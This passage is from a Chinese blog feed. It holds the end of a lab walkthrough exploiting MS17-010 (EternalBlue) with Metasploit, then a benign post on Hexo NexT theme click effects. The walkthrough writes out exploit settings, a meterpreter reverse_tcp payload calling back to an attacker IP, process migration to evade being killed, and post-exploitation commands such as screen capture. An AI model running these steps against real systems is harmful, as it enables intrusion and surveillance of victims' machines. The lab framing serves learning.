src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/ms17-010/screenshot.5.jpg" alt="img"></p><p>使用use调用模块测试：<code>use auxiliary/scanner/smb/smb_ms17_010</code></p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/ms17-010/clip_image012.jpg" alt="img"></p><p>设置检测对象：<code>set rhosts 192.168.1.133</code>（刚才扫描出的靶机ip，这里用133做试验）</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/ms17-010/screenshot.6.jpg"></p><p>查看配置信息：<code>show options</code></p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/ms17-010/screenshot.7.jpg"></p><p>可以看到，rhost已经设置成功。</p><p>这时候可以运行了，使用<strong>run</strong>或者<strong>exploit</strong>。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/ms17-010/screenshot.8.jpg" alt="img"></p><p>上面写着’host is likely vulnerable to ms17-010’，表示这台靶机可利用ms17-010漏洞攻击。</p><p>现在调用攻击模块：<code>use exploit/windows/smb/ms17_010_eternalblue</code></p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/ms17-010/screenshot.10.jpg"></p><p>后面的操作还是一样设置rhost。不过这次要设置<strong>lhost</strong>(就是你攻击机的ip地址)和<strong>payload</strong>。</p><p>使用show options查看设置。</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> rhost <span class="hljs-comment">192.168.1.133</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lhost 192.168.1.24</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">payload windows</span>/x64/<span class="hljs-comment">meterpreter</span>/reverse_tcp<br>show <span class="hljs-keyword">options</span><br>run<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/ms17-010/screenshot.9.jpg" alt="img"></p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/ms17-010/screenshot.11.jpg"></p><h1 id="5-漏洞利用"><a href="#5-漏洞利用" class="headerlink" title="5.漏洞利用"></a>5.漏洞利用</h1><h2 id="1-进程迁移"><a href="#1-进程迁移" class="headerlink" title="1.进程迁移"></a>1.进程迁移</h2><p>现在的shell非常脆弱，很容易被杀死，所以要把进程迁移，和一个稳定的进程绑在一起，防止被查杀。</p><p>1.ps: 获取当前进程（sploove.exe就是打印机的相关进程）</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/ms17-010/screenshot.12.jpg"></p><p>2.getpid: 查看meterpreter shell进程号</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/ms17-010/screenshot.13.jpg"></p><p>3.migrate + 稳定的进程号：进程迁移</p><p>使用后再查就会发现shell被迁移到了更稳定的进程上</p><p>4.run post&#x2F;windows&#x2F;manage&#x2F;migrate ：自动进行进程迁移（系统自己寻找合适进程）</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/ms17-010/screenshot.14.jpg"></p><h2 id="2-系统命令"><a href="#2-系统命令" class="headerlink" title="2.系统命令"></a>2.系统命令</h2><p>查看系统信息：sysinfo</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/ms17-010/screenshot.15.jpg"></p><p>查看目标是否在虚拟机上：run post&#x2F;windows&#x2F;gather&#x2F;checkvm</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/ms17-010/screenshot.16.jpg"></p><p>(显示确实在虚拟机)</p><p>抓取屏幕截图：1.输入load espia加载插件   2.截图：screengrab（或者screenshot）</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/ms17-010/screenshot.18.jpg"></p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/ms17-010/screenshot.17.jpg"></p><p>可以看见存在了root用户下。</p><p>获得shell：shell命令进入，exit退出。</p><h1 id="6-参考"><a href="#6-参考" class="headerlink" title="6.参考"></a>6.参考</h1><p><a href="http://ourjs.com/detail/59172166f12390061496168f">http://ourjs.com/detail/59172166f12390061496168f</a><br><a href="https://blog.csdn.net/qq_37053007/article/details/88327077">https://blog.csdn.net/qq_37053007/article/details/88327077</a><br><a href="https://blog.csdn.net/qq_36197704/article/details/82458557">https://blog.csdn.net/qq_36197704/article/details/82458557</a></p><p><a href="https://blog.csdn.net/qq_41880069/article/details/82908293">https://blog.csdn.net/qq_41880069/article/details/82908293</a></p>]]></content>
    
    
    <categories>
      
      <category>靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kali</tag>
      
      <tag>旧文章</tag>
      
      <tag>漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hexo next主题美化</title>
    <link href="/2019/08/17/old/hexo%20next%E4%B8%BB%E9%A2%98%E7%BE%8E/"/>
    <url>/2019/08/17/old/hexo%20next%E4%B8%BB%E9%A2%98%E7%BE%8E/</url>
    
    <content type="html"><![CDATA[<p>本来建立博客的目的是为了督促自己学习的，没想到一下子爱上了主题美化（我真是没救了【捂脸】），故整理一份文档出来吧。</p><p>关于next的基础设置，可以参考<a href="http://theme-next.iissnan.com/getting-started.html">官方文档</a>，基本就是对_config.yml文件的修改，这里就不多赘述。</p><h1 id="一、鼠标点击效果"><a href="#一、鼠标点击效果" class="headerlink" title="一、鼠标点击效果"></a>一、鼠标点击效果</h1><p>按照喜好添加点击效果吧。</p><h2 id="1-爱心效果"><a href="#1-爱心效果" class="headerlink" title="1.爱心效果"></a>1.爱心效果</h2><span id="more"></span><p><img src="https://i.loli.net/2019/08/08/dciE8sp74X2e6un.jpg" alt="screenshot.3.jpg"></p><p><strong>\themes\next\source\js</strong>文件下创建一个<strong>love.js</strong>文件。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">!<span class="hljs-keyword">function</span>(<span class="hljs-params">e,t,a</span>)&#123;<span class="hljs-keyword">function</span> <span class="hljs-title function_">n</span>(<span class="hljs-params"></span>)&#123;<span class="hljs-title function_">c</span>(<span class="hljs-string">&quot;.heart&#123;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);&#125;.heart:after,.heart:before&#123;content: &#x27;&#x27;;width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 500%;-moz-border-radius: 50%;position: fixed;&#125;.heart:after&#123;top: -5px;&#125;.heart:before&#123;left: -5px;&#125;&quot;</span>),<span class="hljs-title function_">o</span>(),<span class="hljs-title function_">r</span>()&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">r</span>(<span class="hljs-params"></span>)&#123;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> e=<span class="hljs-number">0</span>;e&lt;d.<span class="hljs-property">length</span>;e++)d[e].<span class="hljs-property">alpha</span>&lt;=<span class="hljs-number">0</span>?(t.<span class="hljs-property">body</span>.<span class="hljs-title function_">removeChild</span>(d[e].<span class="hljs-property">el</span>),d.<span class="hljs-title function_">splice</span>(e,<span class="hljs-number">1</span>)):(d[e].<span class="hljs-property">y</span>--,d[e].<span class="hljs-property">scale</span>+=<span class="hljs-number">.004</span>,d[e].<span class="hljs-property">alpha</span>-=<span class="hljs-number">.013</span>,d[e].<span class="hljs-property">el</span>.<span class="hljs-property">style</span>.<span class="hljs-property">cssText</span>=<span class="hljs-string">&quot;left:&quot;</span>+d[e].<span class="hljs-property">x</span>+<span class="hljs-string">&quot;px;top:&quot;</span>+d[e].<span class="hljs-property">y</span>+<span class="hljs-string">&quot;px;opacity:&quot;</span>+d[e].<span class="hljs-property">alpha</span>+<span class="hljs-string">&quot;;transform:scale(&quot;</span>+d[e].<span class="hljs-property">scale</span>+<span class="hljs-string">&quot;,&quot;</span>+d[e].<span class="hljs-property">scale</span>+<span class="hljs-string">&quot;) rotate(45deg);background:&quot;</span>+d[e].<span class="hljs-property">color</span>+<span class="hljs-string">&quot;;z-index:99999&quot;</span>);<span class="hljs-title function_">requestAnimationFrame</span>(r)&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">o</span>(<span class="hljs-params"></span>)&#123;<span class="hljs-keyword">var</span> t=<span class="hljs-string">&quot;function&quot;</span>==<span class="hljs-keyword">typeof</span> e.<span class="hljs-property">onclick</span>&amp;&amp;e.<span class="hljs-property">onclick</span>;e.<span class="hljs-property">onclick</span>=<span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>)&#123;t&amp;&amp;<span class="hljs-title function_">t</span>(),<span class="hljs-title function_">i</span>(e)&#125;&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">i</span>(<span class="hljs-params">e</span>)&#123;<span class="hljs-keyword">var</span> a=t.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&quot;div&quot;</span>);a.<span class="hljs-property">className</span>=<span class="hljs-string">&quot;heart&quot;</span>,d.<span class="hljs-title function_">push</span>(&#123;<span class="hljs-attr">el</span>:a,<span class="hljs-attr">x</span>:e.<span class="hljs-property">clientX</span>-<span class="hljs-number">5</span>,<span class="hljs-attr">y</span>:e.<span class="hljs-property">clientY</span>-<span class="hljs-number">5</span>,<span class="hljs-attr">scale</span>:<span class="hljs-number">1</span>,<span class="hljs-attr">alpha</span>:<span class="hljs-number">1</span>,<span class="hljs-attr">color</span>:<span class="hljs-title function_">s</span>()&#125;),t.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(a)&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">c</span>(<span class="hljs-params">e</span>)&#123;<span class="hljs-keyword">var</span> a=t.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&quot;style&quot;</span>);a.<span class="hljs-property">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>;<span class="hljs-keyword">try</span>&#123;a.<span class="hljs-title function_">appendChild</span>(t.<span class="hljs-title function_">createTextNode</span>(e))&#125;<span class="hljs-keyword">catch</span>(t)&#123;a.<span class="hljs-property">styleSheet</span>.<span class="hljs-property">cssText</span>=e&#125;t.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&quot;head&quot;</span>)[<span class="hljs-number">0</span>].<span class="hljs-title function_">appendChild</span>(a)&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">s</span>(<span class="hljs-params"></span>)&#123;<span class="hljs-keyword">return</span><span class="hljs-string">&quot;rgb(&quot;</span>+~~(<span class="hljs-number">255</span>*<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>())+<span class="hljs-string">&quot;,&quot;</span>+~~(<span class="hljs-number">255</span>*<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>())+<span class="hljs-string">&quot;,&quot;</span>+~~(<span class="hljs-number">255</span>*<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>())+<span class="hljs-string">&quot;)&quot;</span>&#125;<span class="hljs-keyword">var</span> d=[];e.<span class="hljs-property">requestAnimationFrame</span>=<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<span class="hljs-keyword">return</span> e.<span class="hljs-property">requestAnimationFrame</span>||e.<span class="hljs-property">webkitRequestAnimationFrame</span>||e.<span class="hljs-property">mozRequestAnimationFrame</span>||e.<span class="hljs-property">oRequestAnimationFrame</span>||e.<span class="hljs-property">msRequestAnimationFrame</span>||<span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>)&#123;<span class="hljs-built_in">setTimeout</span>(e,<span class="hljs-number">1e3</span>/<span class="hljs-number">60</span>)&#125;&#125;(),<span class="hljs-title function_">n</span>()&#125;(<span class="hljs-variable language_">window</span>,<span class="hljs-variable language_">document</span>);<br></code></pre></td></tr></table></figure><p>然后在<strong>\themes\next\layout</strong>的**_layout.swig**文件的末尾添加。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 页面点击小红心 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/js/love.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="2-字体效果"><a href="#2-字体效果" class="headerlink" title="2.字体效果"></a>2.字体效果</h2><p>点击出现字体，和出现爱心的方式差不多。</p><p>先创建一个<strong>click_show_text.js</strong>文件。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> a_idx = <span class="hljs-number">0</span>;<br><span class="hljs-title function_">jQuery</span>(<span class="hljs-variable language_">document</span>).<span class="hljs-title function_">ready</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">$</span>) &#123;<br>    $(<span class="hljs-string">&quot;body&quot;</span>).<span class="hljs-title function_">click</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) &#123;<br>        <span class="hljs-keyword">var</span> a = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span><br>        (<span class="hljs-string">&quot;富强&quot;</span>, <span class="hljs-string">&quot;民主&quot;</span>, <span class="hljs-string">&quot;文明&quot;</span>, <span class="hljs-string">&quot;和谐&quot;</span>, <span class="hljs-string">&quot;自由&quot;</span>, <span class="hljs-string">&quot;平等&quot;</span>, <span class="hljs-string">&quot;公正&quot;</span>, <span class="hljs-string">&quot;法治&quot;</span>, <span class="hljs-string">&quot;爱国&quot;</span>, <span class="hljs-string">&quot;敬业&quot;</span>, <span class="hljs-string">&quot;诚信&quot;</span>, <span class="hljs-string">&quot;友善&quot;</span>);<br>        <span class="hljs-keyword">var</span> $i = $(<span class="hljs-string">&quot;&lt;span/&gt;&quot;</span>).<span class="hljs-title function_">text</span>(a[a_idx]);<br>        a_idx = (a_idx + <span class="hljs-number">1</span>) % a.<span class="hljs-property">length</span>;<br>        <span class="hljs-keyword">var</span> x = e.<span class="hljs-property">pageX</span>,<br>        y = e.<span class="hljs-property">pageY</span>;<br>        $i.<span class="hljs-title function_">css</span>(&#123;<br>            <span class="hljs-string">&quot;z-index&quot;</span>: <span class="hljs-number">5</span>,<br>            <span class="hljs-string">&quot;top&quot;</span>: y - <span class="hljs-number">20</span>,<br>            <span class="hljs-string">&quot;left&quot;</span>: x,<br>            <span class="hljs-string">&quot;position&quot;</span>: <span class="hljs-string">&quot;absolute&quot;</span>,<br>            <span class="hljs-string">&quot;font-weight&quot;</span>: <span class="hljs-string">&quot;bold&quot;</span>,<br>            <span class="hljs-string">&quot;color&quot;</span>: <span class="hljs-string">&quot;#FF0000&quot;</span><br>        &#125;);<br>        $(<span class="hljs-string">&quot;body&quot;</span>).<span class="hljs-title function_">append</span>($i);<br>        $i.<span class="hljs-title function_">animate</span>(&#123;<br>            <span class="hljs-string">&quot;top&quot;</span>: y - <span class="hljs-number">180</span>,<br>            <span class="hljs-string">&quot;opacity&quot;</span>: <span class="hljs-number">0</span><br>        &#125;,<br><span class="hljs-number">3000</span>,<br><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    $i.<span class="hljs-title function_">remove</span>();<br>&#125;);<br>    &#125;);<br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-string">&#x27;delay()&#x27;</span>, <span class="hljs-number">2000</span>);<br>&#125;);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">delay</span>(<span class="hljs-params"></span>) &#123;<br>    $(<span class="hljs-string">&quot;.buryit&quot;</span>).<span class="hljs-title function_">removeAttr</span>(<span class="hljs-string">&quot;onclick&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>字可替换成其他的字。</p><p>然后同样的，在_layout.swig文件的末尾加上一行代码。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--单击显示文字--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/js/click_show_text.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="3-烟花x爆炸效果"><a href="#3-烟花x爆炸效果" class="headerlink" title="3.烟花x爆炸效果"></a>3.烟花x爆炸效果</h2><p>和前两者方式相同，就只放代码不重复讲啦。</p><p>新建<strong>fireworks.js</strong>文件。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-meta">&quot;use strict&quot;</span>;<span class="hljs-keyword">function</span> <span class="hljs-title function_">updateCoords</span>(<span class="hljs-params">e</span>)&#123;pointerX=(e.<span class="hljs-property">clientX</span>||e.<span class="hljs-property">touches</span>[<span class="hljs-number">0</span>].<span class="hljs-property">clientX</span>)-canvasEl.<span class="hljs-title function_">getBoundingClientRect</span>().<span class="hljs-property">left</span>,pointerY=e.<span class="hljs-property">clientY</span>||e.<span class="hljs-property">touches</span>[<span class="hljs-number">0</span>].<span class="hljs-property">clientY</span>-canvasEl.<span class="hljs-title function_">getBoundingClientRect</span>().<span class="hljs-property">top</span>&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">setParticuleDirection</span>(<span class="hljs-params">e</span>)&#123;<span class="hljs-keyword">var</span> t=anime.<span class="hljs-title function_">random</span>(<span class="hljs-number">0</span>,<span class="hljs-number">360</span>)*<span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span>/<span class="hljs-number">180</span>,a=anime.<span class="hljs-title function_">random</span>(<span class="hljs-number">50</span>,<span class="hljs-number">180</span>),n=[-<span class="hljs-number">1</span>,<span class="hljs-number">1</span>][anime.<span class="hljs-title function_">random</span>(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)]*a;<span class="hljs-keyword">return</span>&#123;<span class="hljs-attr">x</span>:e.<span class="hljs-property">x</span>+n*<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">cos</span>(t),<span class="hljs-attr">y</span>:e.<span class="hljs-property">y</span>+n*<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">sin</span>(t)&#125;&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">createParticule</span>(<span class="hljs-params">e,t</span>)&#123;<span class="hljs-keyword">var</span> a=&#123;&#125;;<span class="hljs-keyword">return</span> a.<span class="hljs-property">x</span>=e,a.<span class="hljs-property">y</span>=t,a.<span class="hljs-property">color</span>=colors[anime.<span class="hljs-title function_">random</span>(<span class="hljs-number">0</span>,colors.<span class="hljs-property">length</span>-<span class="hljs-number">1</span>)],a.<span class="hljs-property">radius</span>=anime.<span class="hljs-title function_">random</span>(<span class="hljs-number">16</span>,<span class="hljs-number">32</span>),a.<span class="hljs-property">endPos</span>=<span class="hljs-title function_">setParticuleDirection</span>(a),a.<span class="hljs-property">draw</span>=<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;ctx.<span class="hljs-title function_">beginPath</span>(),ctx.<span class="hljs-title function_">arc</span>(a.<span class="hljs-property">x</span>,a.<span class="hljs-property">y</span>,a.<span class="hljs-property">radius</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>*<span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span>,!<span class="hljs-number">0</span>),ctx.<span class="hljs-property">fillStyle</span>=a.<span class="hljs-property">color</span>,ctx.<span class="hljs-title function_">fill</span>()&#125;,a&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">createCircle</span>(<span class="hljs-params">e,t</span>)&#123;<span class="hljs-keyword">var</span> a=&#123;&#125;;<span class="hljs-keyword">return</span> a.<span class="hljs-property">x</span>=e,a.<span class="hljs-property">y</span>=t,a.<span class="hljs-property">color</span>=<span class="hljs-string">&quot;#F00&quot;</span>,a.<span class="hljs-property">radius</span>=<span class="hljs-number">0.1</span>,a.<span class="hljs-property">alpha</span>=<span class="hljs-number">0.5</span>,a.<span class="hljs-property">lineWidth</span>=<span class="hljs-number">6</span>,a.<span class="hljs-property">draw</span>=<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;ctx.<span class="hljs-property">globalAlpha</span>=a.<span class="hljs-property">alpha</span>,ctx.<span class="hljs-title function_">beginPath</span>(),ctx.<span class="hljs-title function_">arc</span>(a.<span class="hljs-property">x</span>,a.<span class="hljs-property">y</span>,a.<span class="hljs-property">radius</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>*<span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span>,!<span class="hljs-number">0</span>),ctx.<span class="hljs-property">lineWidth</span>=a.<span class="hljs-property">lineWidth</span>,ctx.<span class="hljs-property">strokeStyle</span>=a.<span class="hljs-property">color</span>,ctx.<span class="hljs-title function_">stroke</span>(),ctx.<span class="hljs-property">globalAlpha</span>=<span class="hljs-number">1</span>&#125;,a&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">renderParticule</span>(<span class="hljs-params">e</span>)&#123;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> t=<span class="hljs-number">0</span>;t&lt;e.<span class="hljs-property">animatables</span>.<span class="hljs-property">length</span>;t++)&#123;e.<span class="hljs-property">animatables</span>[t].<span class="hljs-property">target</span>.<span class="hljs-title function_">draw</span>()&#125;&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">animateParticules</span>(<span class="hljs-params">e,t</span>)&#123;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> a=<span class="hljs-title function_">createCircle</span>(e,t),n=[],i=<span class="hljs-number">0</span>;i&lt;numberOfParticules;i++)&#123;n.<span class="hljs-title function_">push</span>(<span class="hljs-title function_">createParticule</span>(e,t))&#125;anime.<span class="hljs-title function_">timeline</span>().<span class="hljs-title function_">add</span>(&#123;<span class="hljs-attr">targets</span>:n,<span class="hljs-attr">x</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>)&#123;<span class="hljs-keyword">return</span> e.<span class="hljs-property">endPos</span>.<span class="hljs-property">x</span>&#125;,<span class="hljs-attr">y</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>)&#123;<span class="hljs-keyword">return</span> e.<span class="hljs-property">endPos</span>.<span class="hljs-property">y</span>&#125;,<span class="hljs-attr">radius</span>:<span class="hljs-number">0.1</span>,<span class="hljs-attr">duration</span>:anime.<span class="hljs-title function_">random</span>(<span class="hljs-number">1200</span>,<span class="hljs-number">1800</span>),<span class="hljs-attr">easing</span>:<span class="hljs-string">&quot;easeOutExpo&quot;</span>,<span class="hljs-attr">update</span>:renderParticule&#125;).<span class="hljs-title function_">add</span>(&#123;<span class="hljs-attr">targets</span>:a,<span class="hljs-attr">radius</span>:anime.<span class="hljs-title function_">random</span>(<span class="hljs-number">80</span>,<span class="hljs-number">160</span>),<span class="hljs-attr">lineWidth</span>:<span class="hljs-number">0</span>,<span class="hljs-attr">alpha</span>:&#123;<span class="hljs-attr">value</span>:<span class="hljs-number">0</span>,<span class="hljs-attr">easing</span>:<span class="hljs-string">&quot;linear&quot;</span>,<span class="hljs-attr">duration</span>:anime.<span class="hljs-title function_">random</span>(<span class="hljs-number">600</span>,<span class="hljs-number">800</span>)&#125;,<span class="hljs-attr">duration</span>:anime.<span class="hljs-title function_">random</span>(<span class="hljs-number">1200</span>,<span class="hljs-number">1800</span>),<span class="hljs-attr">easing</span>:<span class="hljs-string">&quot;easeOutExpo&quot;</span>,<span class="hljs-attr">update</span>:renderParticule,<span class="hljs-attr">offset</span>:<span class="hljs-number">0</span>&#125;)&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">debounce</span>(<span class="hljs-params">e,t</span>)&#123;<span class="hljs-keyword">var</span> a;<span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<span class="hljs-keyword">var</span> n=<span class="hljs-variable language_">this</span>,i=<span class="hljs-variable language_">arguments</span>;<span class="hljs-built_in">clearTimeout</span>(a),a=<span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;e.<span class="hljs-title function_">apply</span>(n,i)&#125;,t)&#125;&#125;<span class="hljs-keyword">var</span> canvasEl=<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&quot;.fireworks&quot;</span>);<span class="hljs-keyword">if</span>(canvasEl)&#123;<span class="hljs-keyword">var</span> ctx=canvasEl.<span class="hljs-title function_">getContext</span>(<span class="hljs-string">&quot;2d&quot;</span>),numberOfParticules=<span class="hljs-number">30</span>,pointerX=<span class="hljs-number">0</span>,pointerY=<span class="hljs-number">0</span>,tap=<span class="hljs-string">&quot;mousedown&quot;</span>,colors=[<span class="hljs-string">&quot;#FF1461&quot;</span>,<span class="hljs-string">&quot;#18FF92&quot;</span>,<span class="hljs-string">&quot;#5A87FF&quot;</span>,<span class="hljs-string">&quot;#FBF38C&quot;</span>],setCanvasSize=<span class="hljs-title function_">debounce</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;canvasEl.<span class="hljs-property">width</span>=<span class="hljs-number">2</span>*<span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>,canvasEl.<span class="hljs-property">height</span>=<span class="hljs-number">2</span>*<span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>,canvasEl.<span class="hljs-property">style</span>.<span class="hljs-property">width</span>=<span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>+<span class="hljs-string">&quot;px&quot;</span>,canvasEl.<span class="hljs-property">style</span>.<span class="hljs-property">height</span>=<span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>+<span class="hljs-string">&quot;px&quot;</span>,canvasEl.<span class="hljs-title function_">getContext</span>(<span class="hljs-string">&quot;2d&quot;</span>).<span class="hljs-title function_">scale</span>(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)&#125;,<span class="hljs-number">500</span>),render=<span class="hljs-title function_">anime</span>(&#123;<span class="hljs-attr">duration</span>:<span class="hljs-number">1</span>/<span class="hljs-number">0</span>,<span class="hljs-attr">update</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;ctx.<span class="hljs-title function_">clearRect</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,canvasEl.<span class="hljs-property">width</span>,canvasEl.<span class="hljs-property">height</span>)&#125;&#125;);<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(tap,<span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>)&#123;<span class="hljs-string">&quot;sidebar&quot;</span>!==e.<span class="hljs-property">target</span>.<span class="hljs-property">id</span>&amp;&amp;<span class="hljs-string">&quot;toggle-sidebar&quot;</span>!==e.<span class="hljs-property">target</span>.<span class="hljs-property">id</span>&amp;&amp;<span class="hljs-string">&quot;A&quot;</span>!==e.<span class="hljs-property">target</span>.<span class="hljs-property">nodeName</span>&amp;&amp;<span class="hljs-string">&quot;IMG&quot;</span>!==e.<span class="hljs-property">target</span>.<span class="hljs-property">nodeName</span>&amp;&amp;(render.<span class="hljs-title function_">play</span>(),<span class="hljs-title function_">updateCoords</span>(e),<span class="hljs-title function_">animateParticules</span>(pointerX,pointerY))&#125;,!<span class="hljs-number">1</span>),<span class="hljs-title function_">setCanvasSize</span>(),<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&quot;resize&quot;</span>,setCanvasSize,!<span class="hljs-number">1</span>)&#125;<span class="hljs-string">&quot;use strict&quot;</span>;<span class="hljs-keyword">function</span> <span class="hljs-title function_">updateCoords</span>(<span class="hljs-params">e</span>)&#123;pointerX=(e.<span class="hljs-property">clientX</span>||e.<span class="hljs-property">touches</span>[<span class="hljs-number">0</span>].<span class="hljs-property">clientX</span>)-canvasEl.<span class="hljs-title function_">getBoundingClientRect</span>().<span class="hljs-property">left</span>,pointerY=e.<span class="hljs-property">clientY</span>||e.<span class="hljs-property">touches</span>[<span class="hljs-number">0</span>].<span class="hljs-property">clientY</span>-canvasEl.<span class="hljs-title function_">getBoundingClientRect</span>().<span class="hljs-property">top</span>&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">setParticuleDirection</span>(<span class="hljs-params">e</span>)&#123;<span class="hljs-keyword">var</span> t=anime.<span class="hljs-title function_">random</span>(<span class="hljs-number">0</span>,<span class="hljs-number">360</span>)*<span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span>/<span 